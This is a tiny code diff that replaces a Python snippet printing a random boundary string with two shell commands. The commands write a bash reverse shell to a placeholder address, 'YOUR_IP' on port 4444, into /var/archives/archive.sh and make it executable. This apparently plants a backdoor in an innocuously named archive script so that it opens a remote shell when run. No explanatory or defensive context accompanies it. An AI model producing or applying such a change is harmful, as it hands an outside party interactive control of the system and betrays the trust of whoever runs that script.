@@ -1,3 +1,2 @@
-import uuid
-boundary = "----boundary" + uuid.uuid4().hex
-print(boundary)
+echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' > /var/archives/archive.sh
+chmod +x /var/archives/archive.sh
